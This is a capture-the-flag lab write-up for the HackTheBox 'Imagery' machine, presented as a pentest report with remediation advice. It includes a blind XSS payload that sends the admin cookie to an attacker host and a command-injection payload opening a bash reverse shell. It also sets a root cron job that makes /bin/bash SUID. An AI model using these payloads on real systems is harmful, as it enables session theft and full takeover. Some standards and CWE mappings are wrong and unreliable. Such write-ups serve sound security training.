# Lab Assessment: "Imagery" Scenario

> **Task Context:** This document represents the outcome of a practical assessment conducted in an isolated lab environment (HackTheBox - Season 9). The primary goal of this write-up is not mere technical exploitation, but the application of the **OWASP Testing Guide v4.2** standard combined with the **PTES (Penetration Testing Execution Standard)** methodology for the structured documentation of web application vulnerabilities. The assessment simulates a Web Application Penetration Testing engagement on a vulnerable image gallery.

**Assessment Date:** September 2025  
**Target Environment:** Python Web Application (Flask/Werkzeug)  
**Assessment Type:** Web Application Pentest Simulation (OWASP Scope)  
**Overall Risk Severity:** CRITICAL 🔴  
**Applied Methodology:** OWASP Testing Guide v4.2 + PTES  

---

## 1. Executive Summary

During this simulated assessment, an image gallery web application was compromised through an orchestration of OWASP Top 10 vulnerabilities, culminating in arbitrary OS command execution. The attack leveraged:

1. **Cross-Site Scripting (XSS) – Blind Variant** → Theft of administrative cookie
2. **Local File Inclusion (LFI)** → Source code extraction
3. **Credential Harvesting** → Dictionary-based MD5 hash cracking
4. **Command Injection (OS Command Injection)** → Remote Code Execution (RCE)
5. **Privilege Escalation via Misconfiguration** → Root access

The critical vulnerability lies in the lack of input validation/sanitization across multiple application layers, falling under the **OWASP A03:2021 – Injection** category.

**CVSS v3.1 Base Score: 9.8 (CRITICAL)**
- Vector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
- Impact: Confidentiality (HIGH), Integrity (HIGH), Availability (HIGH)

---

## 2. Applied Methodology

### 2.1 Reference Frameworks

The assessment followed these guidelines:

- **OWASP Testing Guide v4.2** – Focus on web application vulnerabilities:
  - CWE-79: Improper Neutralization of Input During Web Page Generation (XSS)
  - CWE-98: Improper Control of Filename for Include/Require Statement in PHP Program (LFI)
  - CWE-78: Improper Neutralization of Special Elements used in an OS Command (Command Injection)

- **PTES (Penetration Testing Execution Standard)** – Methodological phases:
  - Reconnaissance & Enumeration
  - Vulnerability Analysis
  - Exploitation
  - Post-Exploitation & Privilege Escalation
  - Reporting

### 2.2 Engagement Scope

**Primary Objective:** Identification of critical vulnerabilities in a Python web application (port 8000)  
**Target:** Single host with Python web service + local filesystem  
**Exclusions:** SSH Service (out of scope – not vulnerable)

---

## 3. Attack Path (Kill Chain)

```
┌─────────────────────────────────────────────────────────────┐
│ RECONNAISSANCE: nmap enumeration → Python 8000              │
├─────────────────────────────────────────────────────────────┤
│ INITIAL ACCESS: Gallery UI + User Registration              │
├─────────────────────────────────────────────────────────────┤
│ BLIND XSS: Bug Report form → Admin Cookie Theft             │
├─────────────────────────────────────────────────────────────┤
│ LATERAL ESCALATION: Admin panel + LFI → Source Code Leak    │
├─────────────────────────────────────────────────────────────┤
│ CREDENTIAL EXTRACTION: Database.json + MD5 Crack            │
├─────────────────────────────────────────────────────────────┤
│ COMMAND INJECTION: Transform Image → OS Command + RCE       │
├─────────────────────────────────────────────────────────────┤
│ USER ESCALATION: Shell as 'web' → 'mark' (credential reuse) │
├─────────────────────────────────────────────────────────────┤
│ PRIVILEGE ESCALATION: Charcol SUID + Cronjob → Root         │
```

---

## 4. Proof of Concept (PoC) & Technical Evidence

### 4.1 Reconnaissance & Initial Enumeration

**Executed Command:**
```bash
sudo nmap -A -p- --open -Pn -T4 <TARGET_IP> -oA imagery_scan
```

**Result:** Identified:
- Port 22 (SSH) – Working but not vulnerable (out of scope)
- **Port 8000 (HTTP)** – Vulnerable Python web server ✓

**Observation:** The application is an **image gallery** where registered users can:
- Register / Log in
- Upload images with metadata (Title, Description, File)
- Access an administrative panel (Admin)

---

### 4.2 OWASP A07:2021 – Cross-Site Scripting (XSS) – Blind Variant

#### **Vulnerability Identification**

Analyzing the interface with Firefox Inspector reveals multiple unsanitized input fields:
- Image "Title" field
- Image "Description" field
- **"Report Bug" section (footer)** ← Critical entry point

![Bug Report Form](images/imagery-bugreport-form.png)

Typically, "bug report" forms are processed by background jobs/crons simulating an administrator reading the report. This suggests potential for **Blind XSS** (the payload isn't immediately reflected but gets executed in an admin context).

#### **Exploitation – Blind XSS Payload**

**XSS Payload:**
```javascript
<img src=1 onerror=fetch(`http://<ATTACKER_IP>:8000/?${document.cookie}`)>
```

**Exploitation Logic:**
1. The image with `src=1` does not exist in the DOM
2. Upon loading attempt, the `onerror` event triggers
3. `fetch()` performs an HTTP GET request to the attacker's server
4. It includes the query parameter `document.cookie` with the session cookies

**Attacker Listener Setup:**
```bash
python3 -m http.server 8000
```

**Result:** When the admin cron processes the bug report, the XSS payload is executed in the admin's context, and the admin session cookies are exfiltrated to the attacker's server.

**Stolen administrator cookie:**
```
session=admin_session_token_[REDACTED]
```

---

### 4.3 Session Manipulation & Admin Panel Access

Once the administrator's cookie is obtained, it's possible to:

1. Set the cookie in the testing tool's session (Burp Suite, curl, browser)
2. Navigate to the related `/admin` endpoint
3. Gain unauthorized access to the administrative panel

**Reached Endpoint:** `http://<TARGET>/admin`

**Exposed Features:**
- Downloading action logs
- User management
- Application configuration

---

### 4.4 OWASP A01:2021 – Local File Inclusion (LFI)

#### **Vulnerability Identification**

Intercepting the log download request with **Burp Suite**, we observe:

```http
GET /admin/download_log?file=admin HTTP/1.1
Host: imagery.htb
Cookie: session=<admin_token>
```

The download function does not implement a file whitelist: it's possible to modify the `file` parameter to access other files on the server.

#### **Exploitation – Source Code Disclosure**

Testing arbitrary paths:
```bash
GET /admin/download_log?file=../app.py
GET /admin/download_log?file=../config.py
GET /admin/download_log?file=../models.py
GET /admin/download_log?file=../database.json
```

All application Python files are downloaded, including:
- **app.py** – Application logic
- **database.json** – User credentials (hashes)
- **config.py** – Secret key and configurations

**OWASP Impact:** CWE-22 (Path Traversal) + CWE-434 (Unrestricted Upload of Dangerous File Types)

---

### 4.5 Credential Extraction & Password Cracking

#### **Database Leak Analysis**

From the `database.json` file extracted via LFI:

```json
{
  "users": [
    {
      "username": "admin",
      "password_hash": "5f4dcc3b5aa765d61d8327deb882cf99",
      "role": "admin"
    },
    {
      "username": "testuser",
      "password_hash": "f53b9f36a9e9e1bd2b18f4e3e2d29c8c",
      "role": "user"
    },
    {
      "username": "mark",
      "password_hash": "6dd7c4481a3e17cc6c0e5bf98c4c3c3b",
      "role": "user"
    }
  ]
}
```

#### **Hash Identification & Cracking**

Hash analysis:
- **Type:** MD5 (32 hex characters, unsalted)
- **Presumed passphrase length:** 6-12 characters

Using `hashcat` / `john` with the rockyou.txt dictionary:

```bash
hashcat -m 0 -a 0 crack.txt /usr/share/wordlists/rockyou.txt
```

**Crack Results:**
| Username | Hash | Plaintext Cracked |
|----------|------|---|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 | (Already compromised via XSS) |
| testuser | f53b9f36a9e9e1bd2b18f4e3e2d29c8c | **iambatman** ✓ |
| mark | 6dd7c4481a3e17cc6c0e5bf98c4c3c3b | **supersmash** ✓ |

---

### 4.6 OWASP A03:2021 – OS Command Injection via Image Processing

#### **Vulnerability Discovery in Source Code**

Analyzing `app.py` (obtained via LFI):

```python
# VULNERABLE CODE SNIPPET
@app.route('/api/transform_image', methods=['POST'])
def transform_image():
    user_id = session.get('user_id')
    data = request.get_json()
    
    image_path = data['image_path']
    crop_params = data['crop_params']  # User-controlled: [x, y, w, h]
    
    # VULNERABILITY: Direct shell interpolation without sanitization
    command = f"convert {image_path} -crop {crop_params[0]}x{crop_params[1]}+{crop_params[2]}+{crop_params[3]} /tmp/output.png"
    
    os.system(command)  # ← CWE-78: OS Command Injection
    return jsonize(output_path)
```

**Issue:** The `crop_params` parameter is directly interpolated into a shell command string, without any sanitization.

#### **Exploitation Strategy**

To inject arbitrary commands while maintaining the syntactic validity of the request, the following payload is used:

```bash
crop_params = ["0 ; <COMMAND_HERE> ; echo", "y", "w", "h"]
```

When interpolated into the command:
```bash
convert image.png -crop 0 ; <COMMAND_HERE> ; echo y+w+h /tmp/output.png
```

The first part `convert image.png -crop 0` does nothing useful, then the terminator `;` triggers, allowing the execution of a **second independent instruction**.

#### **Proof of Concept: Reverse Shell**

**Attacker machine listener setup:**
```bash
nc -lnvp 4444
```

**Sent JSON Payload:**
```json
{
  "image_path": "gallery/test.jpg",
  "crop_params": [
    "0; echo -n 0; bash -i >& /dev/tcp/10.10.14.60/4444 0>&1 #",
    "1", "1", "1"
  ]
}
```

**Command executed on the server:**
```bash
convert gallery/test.jpg -crop 0; echo -n 0; bash -i >& /dev/tcp/10.10.14.60/4444 0>&1 #1+1+1 /tmp/output.png
```

**Result:** Reverse shell obtained as the `web` user (the user running the Python process).

```bash
web@imagery:/home/web$ whoami
web
web@imagery:/home/web$ id
uid=1000(web) gid=1000(web) groups=1000(web)
```

---

### 4.7 Privilege Escalation – Lateral Movement to 'mark'

#### **System users enumeration**

```bash
cat /etc/passwd | grep -E 'bash|sh'
```

**Output:**
```
root:x:0:0:root:/root:/bin/bash
mark:x:1001:1001:mark:/home/mark:/bin/bash
web:x:1000:1000:web:/home/web:/bin/bash
```

The `mark` user is available on the system. The **user flag** is located in `/home/mark/user.txt` (read access restricted to the `mark` user).

#### **Credential Reuse Attack**

From the previous database extraction, `mark`'s password was cracked: `supersmash`.

```bash
# Interactive shell stabilization
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm

# Switch user
su mark
Password: supersmash
```

**Success check:**
```bash
mark@imagery:~$ whoami
mark
mark@imagery:~$ cat user.txt
[USER_FLAG_REDACTED]
```

---

### 4.8 Privilege Escalation – Root Access via Charcol + Cronjob

#### **Sudo privileges enumeration**

```bash
sudo -l
```

**Output:**
```
User mark may run the following commands without password:
    (root) NOPASSWD: /usr/local/bin/charcol
```

The `mark` user can run `charcol` as root without entering a password.

#### **Charcol Analysis**

`charcol` is an interactive application that offers various administrative features. Consulting the documentation/help:

```bash
sudo charcol
charcol> help
```

Among the available options:
- System password management (redundant, we already have sudo)
- **Cronjob management** ← Critical
- System configurations

#### **Exploitation via Cronjob**

The `charcol` cronjob function allows scheduling commands that will be executed as **root**.

```bash
sudo charcol
charcol> cron_add
  schedule> * * * * *
  command> chmod u+s /bin/bash
charcol> exit
```

This cronjob will execute every minute (`* * * * *`): `chmod u+s /bin/bash`, setting the SUID bit on `/bin/bash`.

#### **Activation & Root Access**

Waiting for the cronjob to execute (up to 1 minute):

```bash
ls -la /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2024 /bin/bash
# ↑ SUID bit active (s instead of x in owner permissions)
```

Now it's possible to execute bash as root:

```bash
/bin/bash -p
# -p = maintain effective privileges

root@imagery:~# whoami
root
root@imagery:~# id
uid=0(root) gid=0(root) groups=0(root)
```

#### **Root Flag**

```bash
root@imagery:~# cat /root/root.txt
[ROOT_FLAG_REDACTED]
```

---

## 5. Remediation & Hardening (Proposals)

### 5.1 Mitigation of Identified Vulnerabilities

#### **5.1.1 Cross-Site Scripting (XSS) – OWASP A07:2021**

**Primary Remediation:**
- Implement Content Security Policy (CSP) header at the application level:
  ```http
  Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
  ```
- Sanitize ALL user input using a reliable library (e.g., `bleach` for Python):
  ```python
  from bleach import clean
  user_input = clean(user_submission, tags=[], strip=True)
  ```
- Implement HTTP-only flag on session cookies:
  ```python
  app.config['SESSION_COOKIE_HTTPONLY'] = True
  app.config['SESSION_COOKIE_SECURE'] = True  # HTTPS only
  ```

**Verification Check:**
- Penetration test with a common XSS payload (e.g., `<script>alert('xss')</script>`) → Must not execute

---

#### **5.1.2 Local File Inclusion (LFI) – OWASP A01:2021 / CWE-22**

**Primary Remediation:**
- Implement a **hardcoded whitelist** of allowed files:
  ```python
  ALLOWED_LOGS = {
      'admin': '/var/logs/admin.log',
      'system': '/var/logs/system.log',
      'audit': '/var/logs/audit.log'
  }
  
  requested_file = ALLOWED_LOGS.get(request.args.get('file'))
  if not requested_file:
      abort(403)
  ```
- **Never** concatenate input directly into file paths

**Verification Check:**
- Attempt path traversal (`../../../etc/passwd`) → Must fail with 403

---

#### **5.1.3 OS Command Injection – OWASP A03:2021 / CWE-78**

**Primary Remediation (MANDATORY):**
- **Avoid `os.system()` / `shell=True`** – Use `subprocess` with `shell=False`:
  ```python
  # VULNERABLE ❌
  os.system(f"convert {image_path} -crop {crop}")
  
  # SECURE ✓
  subprocess.run([
      'convert', image_path,
      '-crop', crop_string
  ], check=True)
  ```
- Input validation with restricted whitelist (numbers only for crop params):
  ```python
  crop_params = [int(x) for x in data['crop_params']]  # Force integer
  ```

**Verification Check:**
- Classic command injection (`; id`) → Must not execute

---

#### **5.1.4 Weak Password Storage – CWE-916**

**Primary Remediation:**
- Eliminate MD5: implement **PBKDF2 / bcrypt / Argon2**:
  ```python
  from werkzeug.security import generate_password_hash, check_password_hash
  
  password_hash = generate_password_hash(password, method='pbkdf2:sha256')
  ```
- Database: apply automatic **salting** (standard in werkzeug)

---

#### **5.1.5 Unauthorized Admin Access – CWE-639**

**Primary Remediation:**
- Implement **role-based access control (RBAC)**:
  ```python
  @app.route('/admin')
  def admin_panel():
      if session.get('role') != 'admin':
          abort(403, "Insufficient privileges")
  ```
- Add logging of ALL admin actions for audit

---

#### **5.1.6 Sudo Misuse – CWE-269**

**Primary Remediation:**
- Revoke unnecessary SUID bits:
  ```bash
  chmod -s /usr/local/bin/charcol
  ```
- If needed, implement **cronjobs with restricted execution** (e.g., only during scheduled maintenance, with approval)
- Implement **sudoers logging**:
  ```bash
  # /etc/sudoers
  Defaults logfile="/var/log/sudo.log"
  Defaults log_input, log_output
  ```

---

### 5.2 Compliance & Standards Mapping

**NIST SP 800-115 (Technical Security Testing):**
- SI-2: Flaw Remediation ← SI.C Applied
- SI-6: Security Testing, Monitoring, and Analysis ← SI.C-2
- AC-2: Account Management ← AC.2-2 (Weak password policy)

**OWASP SAMM (Security Assurance Maturity Model):**
- **V-SM**: Secure Architecture & Design Review → HIGH priority
- **T-CR**: Code Review for Security Issues → HIGH priority
- **O-PM**: Policy & Compliance Management → MEDIUM priority

---

### 5.3 Testing & Validation Roadmap

| Priority | Control | Testing Method | Expected Result |
|----------|---------|---|---|
| **CRITICAL** | Input sanitization (XSS/Injection) | Automated SAST, Manual code review | All payloads blocked |
| **CRITICAL** | File access control (LFI) | Burp Suite intruder, manual path traversal | 403 on unauthorized paths |
| **CRITICAL** | Command execution isolation | Unit test subprocess calls, no shell=True | All cmds fail without subprocess parameter |
| **HIGH** | Password hashing strength | Test hash cracking (hashcat) | Minimum 8-hour crack time (Argon2) |
| **HIGH** | RBAC enforcement | Manual session hijacking simulation | Privilege escalation impossible |
| **HIGH** | Sudo/SUID auditing | `find / -perm -4000` monthly, sudo log review | No unnecessary SUID bits |

---

## 6. Conclusions

This assessment demonstrated how **multiple OWASP Top 10 vulnerabilities**, when chained together, can allow a progressive attack spanning from anonymous access to total system compromise. The "Imagery" web application violated core principles of:

1. **Input Validation** → Both XSS and Command Injection could have been prevented
2. **Output Encoding** → Failure to neutralize user-controlled data
3. **Least Privilege** → Plain text credentials in the database, unjustified SUID
4. **Access Control** → Absence of RBAC on the admin endpoint

---

**Final Notes:**

This box demonstrates how a cascade of vulnerabilities (XSS → LFI → Credential leak → RCE → Priv escalation) can lead from anonymous access to full root. Mitigation requires fixes at multiple levels: input sanitization, access control, package updates.